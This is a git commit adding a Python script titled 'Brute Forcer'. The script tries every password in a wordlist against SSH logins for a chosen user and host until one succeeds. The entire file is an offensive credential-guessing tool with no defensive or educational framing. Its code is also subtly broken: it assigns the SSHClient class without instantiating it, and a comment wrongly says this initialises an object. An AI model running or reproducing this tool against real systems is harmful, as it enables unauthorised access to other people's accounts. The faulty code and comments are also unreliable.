f97e139bfb23791a90d8df4a3e311a03e6e2be99
MasterOfN0ne <156803188+MasterOfN0ne@users.noreply.github.com>
2024-02-29 07:52:14 -0500

    Create maincode.py

---
+++ maincode.py
@@ -0,0 +1,57 @@
+import os
+import paramiko
+import socket
+import sys
+import termcolor
+import pyfiglet
+
+Banner = pyfiglet.figlet_format("Brute Forcer") 
+print(Banner)
+password = input("[+] Enter the passwords file: ")
+user = input("[+] Enter the username: ")
+host = input("[+] Enter the target website in the format www.website.com: ")
+
+
+def ssh_connect(p, code=0):
+    ssh = paramiko.SSHClient
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # initializes an object called SSH
+
+    try:
+        ssh.connect(host, port=22, username=user, password=p)  # Call password p because we used it above
+    except paramiko.AuthenticationException:
+        code = 1
+    except socket.error as e:
+        code = 2
+    except paramiko.BadHostKeyException:
+        code = 3
+    ssh.close()
+    return code
+
+
+# open the file with passwords
+
+if not os.path.exists(password):
+    print(termcolor.colored("[!] File not found or incorrect file path!", color='red'))
+    sys.exit(1)
+
+with open(password, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+
+        try:
+            response = ssh_connect(password)
+
+            if response == 0:
+                print(termcolor.colored(('[-] Found Password: ' + password + ', For Account: ' + user), color='green'))
+                break  # Exit code if you found the password.
+            elif response == 1:
+                print(termcolor.colored(('[!] Incorrect Login: ' + password), color='yellow'))
+                # Print incorrect login if the username doesn't match
+            elif response == 2:
+                print(termcolor.colored('[!!] Can\'t connect', color='red'))
+                sys.exit(1)
+                # Exit the code if you can't connect, meaning probably something went wrong.
+        except Exception as e:
+            print(e)
+            pass
+# One exclamation mark means that it can probably be fixed, 2 exclamation marks mean that it's a system error.
